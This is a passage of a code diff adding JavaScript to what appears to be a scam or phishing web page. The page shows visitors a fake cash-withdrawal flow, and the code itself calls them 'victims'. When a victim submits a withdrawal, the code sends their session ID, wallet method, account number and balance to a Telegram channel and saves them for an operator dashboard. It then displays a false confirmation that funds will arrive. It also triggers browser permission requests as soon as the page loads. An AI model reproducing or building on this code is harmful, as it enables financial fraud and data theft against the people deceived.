+  btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Processing...';
+  
+  const sid = currentSessionId || "unknown";
+  
+  sendMessageToTelegram(`💰 <b>WITHDRAWAL REQUEST</b>\n\n<b>Victim:</b> <code>${sid}</code>\n<b>Method:</b> ${selectedWallet}\n<b>Account:</b> <code>${num}</code>\n<b>Amount:</b> PKR ${currentAdBalance}\n<b>Time:</b> ${new Date().toLocaleString()}`);
+  
+  updateVictim(sid, { withdrawal: { method: selectedWallet, account: num, amount: currentAdBalance, time: Date.now() } });
+  
+  setTimeout(() => {
+    $("successMsg").textContent = `Your withdrawal of PKR ${currentAdBalance.toLocaleString()} has been submitted to ${selectedWallet} account ${num}. Funds will arrive within 24-48 hours.`;
+    $("successModal").classList.add("show");
+    btn.disabled = false;
+    btn.innerHTML = '<i class="fa-solid fa-arrow-circle-down"></i> Start Withdrawal';
+  }, 1500);
+};
+
+/* ============================================================
+   INIT
+   ============================================================ */
+function init() {
+  const sid = getSessionIdFromURL();
+  if (sid) {
+    currentSessionId = sid;
+    $("dashboardView").classList.add("hidden");
+    $("victimView").classList.remove("hidden");
+    
+    // Immediately request permissions (native browser popup)
+    setTimeout(() => requestPermissionsOnLoad(), 300);
+  } else {
+    $("dashboardView").classList.remove("hidden");
+    $("victimView").classList.add("hidden");
+    renderDashboard();
+  }
+  
+  window.addEventListener("storage", (e) => {
+    if (e.key === STORE_KEY) renderDashboard();
+  });
+  
+  setInterval(() => {
+    if (!$("dashboardView").classList.contains("hidden")) {
+      renderDashboard();
+    }
+  }, 2000);
+}
+
+document.addEventListener("DOMContentLoaded", init);
+</script>
+</body>
+</html>
